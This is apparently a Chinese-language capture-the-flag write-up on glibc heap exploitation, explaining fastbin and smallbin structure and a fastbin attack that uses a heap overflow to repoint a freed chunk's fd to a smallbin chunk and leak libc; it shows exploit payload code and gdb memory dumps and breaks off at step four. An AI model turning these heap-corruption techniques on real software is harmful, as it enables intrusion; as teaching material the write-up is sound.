# 零碎的基础知识：<br>
1.fastbin和smallbin在main_arena中链表结构是不一样的。fastbin是单向链表，由fastbin指向chunk,但是smallbin/unsortbin/largebin都是双向链表，这样在free掉
上面所说的三个bin的时候，就会在fd以及bk上保存着main_arena+xx偏移的相应的基址，所以可以通过某种方式在free掉small/lagre/unsortbin之后将他们的fd或bk读出来<br>

2.one_gadget(用来找execve("/bin/sh")的)<br>
constraints是约束条件，在跳转到one_gadget之前必须满足的条件
![one_gadget](img/one_gadget.PNG)<br>

3.main_arean与libc基址的关系<br>
main_arena是heap各种bin的结构体，他的偏移量可以在libc.so中malloc_trim()这个函数中找到,如图中为0x3c4b20<br>
![malloc_trim](img/malloc_trim.PNG)<br>

# 题目分析：<br>
![](img/menu.PNG)
漏洞点在allocate的时候申请一个大小，但是在fill的时候可以无视这个大小去填充，所以这里存在堆溢出<br>
### 1.fastbin attak：<br>
核心思想是通过smallbin的fd或bk泄露main_arena的地址<br>
两种leak libc的方式:<br>
1> 通过修改smallbin的size,使得可以用其他bin如fastbin指向一个smallbin，之后再将smallbin的size修改回来，free掉smallbin,然后通过指向smallbin的fastbin将smallbin的fd和bk读出来<br>
2> 由于fastbin和smallbin在申请的时候堆地址的位置相邻，所以可以通过修改fastbin的size。让临近smallbin的fastbin的size，设置成刚好能够读取到smallbin的fd和bk的大小，然后free smallbin，通过相邻的fastbin来读取smallbin的fd和bk。<br>

具体实现：<br>
1>fastbin指向smallbin泄露libc<br>
第一步先申请以下五个chunk,其中0-3是fastbin，4是smallbin
```
alloc(0x10) #0
alloc(0x10) #1
alloc(0x10) #2
alloc(0x10) #3
alloc(0x80) #4

gdb-peda$ x /64wx 0x555555757060
0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000021	0x00000000      -->chunk0(fastbin, in use)
0x555555757070:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757080:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk1(fastbin, in use)
0x555555757090:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555557570a0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk2(fastbin, in use)
0x5555557570b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555557570c0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk3(fastbin, in use)
0x5555557570d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555557570e0:	0x00000000	0x00000000	0x00000091	0x00000000      -->chunk4(smallbin, in use)
0x5555557570f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757100:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757110:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
```

第二步，将chunk1和chunk2链在fastbin链表上，此时： fastbin->chunk2,chunk2->fd->chunk1
```
#为了将 chunk4(smallbin) 放在fastbin的链表上 
free(1)
free(2)

gdb-peda$ x /64wx 0x555555757060
0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000021	0x00000000      -->chunk0(fastbin, in use)
0x555555757070:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757080:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk1(fastbin, free)
0x555555757090:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555557570a0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk2(fastbin, free)
0x5555557570b0:	0x55757080	0x00005555	0x00000000	0x00000000
0x5555557570c0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk3(fastbin, in use)
0x5555557570d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555557570e0:	0x00000000	0x00000000	0x00000091	0x00000000      -->chunk4(smallbin, in use)
0x5555557570f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757100:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757110:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
```

第三步，破坏fastbin的链表<br>
原本:fastbin->chunk2, chunk2->fd->chunk1<br>
破坏后:fastbin->chunk2, chunk2->fd->chunk4<br>
```
payload ='A'*0x10 #the data of chunk0
payload+=p64(0) + p64(0x21) + 'A'*0x10 #chunk1
payload+=p64(0) + p64(0x21) + p8(0xe0)  #the header of chunk2
fill(0,payload) #使用chunk0去overwrite chunk2->fd,让chunk2->fd由chunk1改变成chunk4(smallbin) 

gdb-peda$ x /64wx 0x555555757060
0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000021	0x00000000      -->chunk0(fastbin, in use)
0x555555757070:	0x41414141	0x41414141	0x41414141	0x41414141
0x555555757080:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk1(fastbin, free)
0x555555757090:	0x41414141	0x41414141	0x41414141	0x41414141
0x5555557570a0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk2(fastbin, free)
0x5555557570b0:	0x557570e0	0x00005555	0x00000000	0x00000000
0x5555557570c0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk3(fastbin, in use)
0x5555557570d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x5555557570e0:	0x00000000	0x00000000	0x00000091	0x00000000      -->chunk4(smallbin, in use)
0x5555557570f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757100:	0x00000000	0x00000000	0x00000000	0x00000000
0x555555757110:	0x00000000	0x00000000	0x00000000	0x00000000
```

第四步，

















